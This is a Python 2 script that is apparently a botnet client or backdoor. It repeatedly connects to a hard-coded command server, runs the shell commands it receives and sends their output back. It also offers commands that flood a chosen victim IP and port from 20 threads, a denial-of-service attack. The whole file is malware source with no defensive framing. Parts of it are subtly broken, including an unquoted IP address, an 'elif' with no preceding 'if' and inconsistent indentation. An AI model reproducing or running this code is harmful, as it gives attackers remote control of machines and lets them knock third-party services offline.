#!/usr/bin/env python2

import subprocess, os, sys, time, threading, signal, smtplib, random, fnmatch
from socket import *
from threading import Thread

host = 10.3.107.72
port = 80

#Used to make sure a subprocess lasts 30 seconds max-->
class Alarm(Exception):
    pass

def alarm_handler(signum, frame):
    raise Alarm

class tcpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_STREAM)
			s.settimeout(1)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)       
		else:
			break

def tcpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 21):
    		thread = tcpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def main(host, port):
	while 1:
		connected = False
		while 1:
			while (connected == False):
				try:
					s=socket(AF_INET, SOCK_STREAM)
					s.connect((host,port))
					print "[INFO] Connected"
					connected = True
				except:
					time.sleep(5)
			try:
				msg=s.recv(20480)
				allofem = msg.split(";")
				for onebyone in allofem: 
					commands = onebyone.split( )
					elif (commands[0] == "tcpflood"):
						try:
							tcpinfo = commands[1].split(":")
							t = Thread(None,tcpUnleach,None,(tcpinfo[0], tcpinfo[1]))
        						t.start()
							s.send("[INFO] Flooding started\n")
						except:
							s.send("[ERROR] Failed to start Flooding\n")
							pass
					elif (commands[0] == "tcpfloodall"):
						try:
							tcpinfo = commands[1].split(":")
							t = Thread(None,tcpUnleach,None,(tcpinfo[0], tcpinfo[1]))
        						t.start()
						except:
							pass
					elif (commands[0] == "quit"):
						s.close()
						print "[INFO] Connection Closed"
						break
					else:
						thecommand = ' '.join(commands)
						comm = subprocess.Popen(thecommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						signal.signal(signal.SIGALRM, alarm_handler)
						signal.alarm(30)
						try:
    						STDOUT, STDERR = comm.communicate()
							en_STDERR = bytearray(STDERR)
							en_STDOUT = bytearray(STDOUT)
							if (en_STDERR == ""):
								if (en_STDOUT != ""):
									print en_STDOUT
									s.send(en_STDOUT)
								else:
									s.send("[CLIENT] Command Executed")
							else:
								print en_STDERR
								s.send(en_STDERR)
						except Alarm:
							comm.terminate()
							comm.kill()
    							s.send("[CLIENT] 30 Seconds Exceeded - SubProcess Killed\n")				
						signal.alarm(0)
			except KeyboardInterrupt:
				s.close()
				break
			except:
				s.close()
				break
while 1:
	try:
		main(host, port)
	except:
		time.sleep(5)